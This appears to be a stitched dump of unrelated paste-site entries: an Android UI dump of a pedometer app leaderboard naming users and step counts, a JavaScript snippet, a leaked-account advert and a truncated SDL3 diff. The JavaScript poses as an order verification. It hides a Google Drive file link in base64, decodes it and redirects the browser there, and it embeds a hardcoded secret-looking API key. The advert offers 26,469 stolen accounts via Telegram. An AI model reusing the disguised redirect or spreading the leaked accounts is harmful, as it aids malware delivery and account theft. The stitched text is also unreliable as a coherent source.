<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,1393][1080,1609]"">
<node index=""0"" text="""" resource-id="""" class=""android.widget.ImageView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[55,1477][103,1525]""/>
<node index=""1"" text=""1"" resource-id="""" class=""android.widget.TextView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[127,1471][144,1531]""/>
<node index=""2"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[180,1429][324,1573]"">
<node index=""0"" text="""" resource-id="""" class=""android.widget.ImageView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[180,1429][324,1573]""/>
</node>
<node index=""3"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[270,1411][342,1483]"">
<node index=""0"" text="""" resource-id="""" class=""android.widget.ImageView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[270,1411][342,1483]""/>
</node>
<node index=""4"" text=""Jelena Somkina"" resource-id="""" class=""android.widget.TextView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[348,1433][712,1493]""/>
<node index=""5"" text=""770 210"" resource-id="""" class=""android.widget.TextView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[348,1493][500,1545]""/>
<node index=""6"" text="""" resource-id="""" class=""android.widget.ImageView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[512,1501][548,1537]""/>
<node index=""7"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[348,1557][1032,1569]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[348,1557][1032,1569]""/>
</node>
</node>
</node>
</node>
<node index=""1"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,1609][1080,1825]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc=""2, Irina Marčiulynienė 🇱🇹, 480 259"" checkable=""false"" checked=""false"" clickable=""true"" enabled=""true"" focusable=""true"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,1609][1080,1825]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,1609][1080,1825]"">
<node index=""0"" text=""2"" resource-id="""" class=""android.widget.TextView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[116,1687][144,1747]""/>
<node index=""1"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[180,1645][324,1789]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[189,1654][315,1780]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[192,1657][312,1777]"">
<node index=""0"" text="""" resource-id="""" class=""android.widget.ImageView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[192,1657][312,1777]""/>
</node>
</node>
</node>
<node index=""2"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[270,1627][342,1699]"">
<node index=""0"" text="""" resource-id="""" class=""android.widget.ImageView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[270,1627][342,1699]""/>
</node>
<node index=""3"" text=""Irina Marčiulynienė 🇱🇹"" resource-id="""" class=""android.widget.TextView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[348,1649][860,1709]""/>
<node index=""4"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[878,1657][923,1702]"">
<node index=""0"" text="""" resource-id="""" class=""com.horcrux.svg.SvgView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[886,1665][916,1695]"">
<node index=""0"" text="""" resource-id="""" class=""com.horcrux.svg.u"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[888,1667][913,1692]"">
<node index=""1"" text="""" resource-id="""" class=""com.horcrux.svg.u"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[888,1667][913,1692]"">
<node index=""0"" text="""" resource-id="""" class=""com.horcrux.svg.C"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[888,1667][913,1692]""/>
</node>
</node>
</node>
</node>
<node index=""5"" text=""480 259"" resource-id="""" class=""android.widget.TextView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[348,1709][514,1761]""/>
<node index=""6"" text="""" resource-id="""" class=""android.widget.ImageView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[526,1717][562,1753]""/>
<node index=""7"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[348,1773][1032,1785]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[348,1773][775,1785]""/>
</node>
</node>
</node>
</node>
<node index=""2"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,1825][1080,1989]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc=""3, Aurelija Za, 337 729"" checkable=""false"" checked=""false"" clickable=""true"" enabled=""true"" focusable=""true"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,1825][1080,1989]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,1825][1080,1989]"">
<node index=""0"" text=""3"" resource-id="""" class=""android.widget.TextView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[117,1903][144,1963]""/>
<node index=""1"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[180,1861][324,1989]"">
<node index=""0"" text="""" resource-id="""" class=""android.widget.ImageView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[180,1861][324,1989]""/>
</node>
<node index=""2"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[270,1843][342,1915]"">
<node index=""0"" text="""" resource-id="""" class=""android.widget.ImageView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[270,1843][342,1915]""/>
</node>
<node index=""3"" text=""Aurelija Za"" resource-id="""" class=""android.widget.TextView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[348,1865][592,1925]""/>
<node index=""4"" text=""337 729"" resource-id="""" class=""android.widget.TextView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[348,1925][500,1977]""/>
<node index=""5"" text="""" resource-id="""" class=""android.widget.ImageView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[512,1933][548,1969]""/>
</node>
</node>
</node>
</node>
</node>
</node>
</node>
</node>
<node index=""1"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc=""Invite"" checkable=""false"" checked=""false"" clickable=""true"" enabled=""true"" focusable=""true"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[717,1575][1032,1725]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[717,1575][1032,1725]"">
<node index=""0"" text="""" resource-id="""" class=""android.widget.ImageView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[768,1614][840,1686]""/>
<node index=""1"" text=""Invite"" resource-id="""" class=""android.widget.TextView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[864,1620][981,1680]""/>
</node>
</node>
<node index=""2"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,1773][1080,1989]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc=""8, Vytautas, 4 704"" checkable=""false"" checked=""false"" clickable=""true"" enabled=""true"" focusable=""true"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,1773][1080,1989]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,1773][1080,1989]"">
<node index=""0"" text=""8"" resource-id="""" class=""android.widget.TextView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[115,1851][144,1911]""/>
<node index=""1"" text="""" resource-id="""" class=""android.widget.ImageView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[180,1809][324,1953]""/>
<node index=""2"" text=""Vytautas"" resource-id="""" class=""android.widget.TextView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[348,1813][551,1873]""/>
<node index=""3"" text=""4 704"" resource-id="""" class=""android.widget.TextView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[348,1873][462,1925]""/>
<node index=""4"" text="""" resource-id="""" class=""android.widget.ImageView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[474,1881][510,1917]""/>
<node index=""5"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[348,1937][1032,1949]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[348,1937][360,1949]""/>
</node>
</node>
</node>
</node>
</node>
</node>
</node>
</node>
</node>
</node>
</node>
</node>
</node>
</node>
<node index=""1"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,1989][1080,2020]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,1990][1080,2020]""/>
<node index=""1"" text="""" resource-id="""" class=""android.view.View"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,1990][1080,2020]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc=""Main"" checkable=""false"" checked=""false"" clickable=""true"" enabled=""true"" focusable=""true"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,1990][216,2020]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,1990][216,2020]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,1990][216,2020]"">
<node index=""0"" text="""" resource-id="""" class=""android.widget.ImageView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[74,2008][143,2020]""/>
</node>
<node index=""2"" text=""Main"" resource-id="""" class=""android.widget.TextView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,0][0,0]""/>
<node index=""3"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,0][0,0]""/>
</node>
</node>
<node index=""1"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc=""Challenges"" checkable=""false"" checked=""false"" clickable=""true"" enabled=""true"" focusable=""true"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[216,1990][432,2020]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[216,1990][432,2020]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[216,1990][432,2020]"">
<node index=""0"" text="""" resource-id="""" class=""android.widget.ImageView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[290,2008][359,2020]""/>
</node>
<node index=""2"" text=""Challenges"" resource-id="""" class=""android.widget.TextView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,0][0,0]""/>
<node index=""3"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,0][0,0]""/>
</node>
</node>
<node index=""2"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc=""Wallet"" checkable=""false"" checked=""false"" clickable=""true"" enabled=""true"" focusable=""true"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[432,1990][648,2020]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[432,1990][648,2020]"">
<node index=""1"" text="""" resource-id="""" class=""android.widget.ImageView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[506,2008][575,2020]""/>
<node index=""2"" text=""Wallet"" resource-id="""" class=""android.widget.TextView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,0][0,0]""/>
<node index=""3"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,0][0,0]""/>
</node>
</node>
<node index=""3"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc=""Tracks"" checkable=""false"" checked=""false"" clickable=""true"" enabled=""true"" focusable=""true"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[648,1990][864,2020]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[648,1990][864,2020]"">
<node index=""1"" text="""" resource-id="""" class=""android.widget.ImageView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[722,2008][791,2020]""/>
<node index=""2"" text=""Tracks"" resource-id="""" class=""android.widget.TextView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,0][0,0]""/>
<node index=""3"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,0][0,0]""/>
</node>
</node>
<node index=""4"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc=""Profile"" checkable=""false"" checked=""false"" clickable=""true"" enabled=""true"" focusable=""true"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[864,1990][1080,2020]"">
<node index=""0"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[864,1990][1080,2020]"">
<node index=""1"" text="""" resource-id="""" class=""android.widget.ImageView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[938,2008][1007,2020]""/>
<node index=""2"" text=""Profile"" resource-id="""" class=""android.widget.TextView"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,0][0,0]""/>
<node index=""3"" text="""" resource-id="""" class=""android.view.ViewGroup"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,0][0,0]""/>
</node>
</node>
</node>
</node>
</node>
</node>
</node>
</node>
</node>
</node>
</node>
</node>
</node>
</node>
</node>
</node>
</node>
<node index=""1"" text="""" resource-id=""android:id/navigationBarBackground"" class=""android.view.View"" package=""de.walk15.pedometer"" content-desc="""" checkable=""false"" checked=""false"" clickable=""false"" enabled=""true"" focusable=""false"" focused=""false"" scrollable=""false"" long-clickable=""false"" password=""false"" selected=""false"" bounds=""[0,0][0,0]""/>
</node>
</hierarchy>"
FDaXBS3D,Untitled,zebmekey,JavaScript,Sunday 27th of April 2025 09:57:52 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/82323/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ybxUaR9g,Chaturbate with Tokens,jm33,JavaScript,Sunday 27th of April 2025 09:52:23 AM CDT,26469 Accounts Posted On https://t.me/leakedbyem1nem
6AtyngEQ,Untitled,dominus,Diff,Sunday 27th of April 2025 09:43:22 AM CDT,"diff --git a/SDL3Test/U3Dialog.cpp b/SDL3Test/U3Dialog.cpp
index d2c8ff2..007749b 100644
--- a/SDL3Test/U3Dialog.cpp
+++ b/SDL3Test/U3Dialog.cpp
@@ -1,5 +1,5 @@
 #include <filesystem>
-#include <SDL_image.h>
+#include <SDL3_image/SDL_image.h>
 #include ""U3Dialog.h""
 #include ""U3Button.h""
 #include ""U3Utilities.h""
diff --git a/SDL3Test/U3Resources.cpp b/SDL3Test/U3Resources.cpp
index a031daa..ab3cd06 100644
--- a/SDL3Test/U3Resources.cpp
+++ b/SDL3Test/U3Resources.cpp
